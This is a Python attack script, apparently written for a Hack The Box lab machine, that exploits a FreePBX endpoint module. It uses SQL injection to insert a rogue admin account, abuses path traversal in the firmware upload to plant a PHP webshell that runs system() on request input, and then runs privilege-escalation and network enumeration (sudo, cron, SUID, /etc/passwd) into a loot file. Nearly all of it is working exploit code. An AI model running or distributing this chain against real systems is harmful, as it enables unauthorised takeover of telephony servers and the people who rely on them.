#!/usr/bin/env python3
"""Re-establish webshell via CVE-57819 chain and run privesc/network enum."""
import hashlib
import pathlib
import random
import string

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://connected.htb"
LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot/privesc-enum.txt")


def rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def hx(t):
    return "0x" + t.encode().hex()


def get_shell():
    s = requests.Session()
    s.verify = False
    user = "svc_" + rnd(5)
    pw = rnd(12)
    sha1 = hashlib.sha1(pw.encode()).hexdigest()
    shell_dir = rnd(10)
    shell_name = rnd(8) + ".php"

    def sqli(pl):
        s.get(
            f"{BASE}/admin/ajax.php",
            params={
                "module": r"FreePBX\modules\endpoint\ajax",
                "command": "model",
                "template": "x",
                "model": "model",
                "brand": pl,
            },
            timeout=120,
        )

    sqli(f"x'; DELETE FROM asterisk.ampusers WHERE username={hx(user)}-- -")
    sqli(
        "x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections) "
        f"VALUES ({hx(user)},{hx(sha1)},0x2a)-- -"
    )
    s.get(f"{BASE}/admin/config.php", timeout=120)
    s.post(
        f"{BASE}/admin/config.php",
        data={"username": user, "password": pw},
        timeout=120,
    )
    webshell = b'<?php if(isset($_REQUEST["cmd"])){echo "___OUT___";system($_REQUEST["cmd"]);echo "___END___";} ?>'
    files = {
        "dzuuid": (None, "48069f49-c03e-4182-81f7-48e36622e0d3"),
        "dzchunkindex": (None, "0"),
        "dztotalfilesize": (None, str(len(webshell))),
        "dzchunksize": (None, "2000000"),
        "dztotalchunkcount": (None, "1"),
        "dzchunkbyteoffset": (None, "0"),
        "fwbrand": (None, f"../../../var/www/html/{shell_dir}"),
        "fwmodel": (None, "1"),
        "fwversion": (None, "1"),
        "file": (shell_name, webshell, "application/x-php"),
    }
    headers = {
        "Referer": f"{BASE}/admin/config.php?display=epm_advanced",
        "X-Requested-With": "XMLHttpRequest",
    }
    s.post(
        f"{BASE}/admin/ajax.php?module=endpoint&command=upload_cust_fw",
        files=files,
        headers=headers,
        timeout=120,
    )
    url = f"{BASE}/{shell_dir}/{shell_name}"

    def cmd(c, timeout=120):
        r = s.get(url, params={"cmd": c}, timeout=timeout)
        if "___OUT___" in r.text:
            return r.text.split("___OUT___", 1)[1].split("___END___", 1)[0].strip()
        return r.text[:8000]

    return cmd, url


COMMANDS = [
    ("=== id / groups ===", "id; groups; cat /etc/passwd | grep -E 'bash|sh$'"),
    ("=== sudo -l ===", "sudo -l 2>&1"),
    ("=== sudo -l (asterisk) ===", "sudo -n -l 2>&1"),
    (
        "=== cron system ===",
        "cat /etc/crontab 2>/dev/null; echo '---cron.d---'; ls -la /etc/cron.d/ 2>/dev/null; "
        "for f in /etc/cron.d/*; do echo \"### $f\"; cat \"$f\" 2>/dev/null; done",
    ),
    (
        "=== cron hourly/daily ===",
        "ls -la /etc/cron.hourly /etc/cron.daily /var/spool/cron 2>/dev/null; "
        "cat /var/spool/cron/asterisk 2>/dev/null; cat /var/spool/cron/root 2>/dev/null",
    ),
    (
        "=== systemd root services (running) ===",
        "systemctl list-units --type=service --state=running 2>/dev/null | head -60",
    ),
    (
        "=== unit files with User=root / interesting ===",
        "grep -rEl 'User=root|ExecStart' /etc/systemd/system /usr/lib/systemd/system 2>/dev/null | "
        "head -30; systemctl show -p User,ExecStart freepbx 2>/dev/null; "
        "systemctl show -p User,ExecStart asterisk 2>/dev/null; "
        "systemctl show -p User,ExecStart httpd 2>/dev/null",
    ),
    (
        "=== listening (all + localhost) ===",
        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
    ),
    (
        "=== listening UDP localhost ===",
        "ss -ulnp 2>/dev/null | head -30",
    ),
    (
        "=== processes as root (sample) ===",
        "ps aux 2>/dev/null | grep '^root' | head -40",
    ),
    (
        "=== capabilities / SUID quick ===",
        "getcap -r / 2>/dev/null | head -25; find / -perm -4000 -type f 2>/dev/null | head -35",
    ),
    (
        "=== freepbx / asterisk paths ===",
        "ls -la /etc/freepbx.conf /var/spool/cron 2>/dev/null; "
        "grep -r cxpanel /etc 2>/dev/null | head -10",
    ),
]


def main():
    print("[*] getting shell...")
    cmd, url = get_shell()
    print("[+]", url)
    lines = [f"shell: {url}\n"]
    for title, c in COMMANDS:
        print(title)
        out = cmd(c)
        lines.append(f"\n{title}\n{out}\n")
    text = "\n".join(lines)
    LOOT.write_text(text)
    print(f"\n[+] saved {LOOT}")
    print(text[:12000])
    if len(text) > 12000:
        print(f"\n... truncated in chat, full log in {LOOT}")


if __name__ == "__main__":
    main()